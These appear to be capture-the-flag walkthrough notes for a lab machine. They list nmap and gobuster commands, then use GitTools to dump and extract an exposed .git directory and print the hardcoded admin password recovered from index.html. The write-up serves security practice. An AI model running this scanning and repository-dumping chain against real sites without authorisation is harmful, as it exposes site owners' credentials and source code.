First do an NMAP scan
	sudo nmap -A -O -vv -sC -sV -p- 10.10.61.171
Now we can do a directory buster
	I ran quite a few, however the fastest one was common.txt
		gobuster dir -u http://10.10.61.171/ -w /usr/share/wordlists/dirb/common.txt 
			WE FIND A /.git/HEAD
			this means we can use a gitdumper to see what is within the .git
git clone https://github.com/internetwache/GitTools.git
	cd GitTools
		cd Dumper
			./gitdumper.sh 10.10.61.171/.git/ .
Now we have to extract what we just dumped
	cd Extractor
		./extractor.sh ~/GitTools/Dumper/ .
			ls -la 
				we see a lot of directories
					cd 4-395e087334d613d5e423cdf8f7be27196a360459/
						cat index.html
			Now we can find the username and password!!!
				  username === "admin" &&
			          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
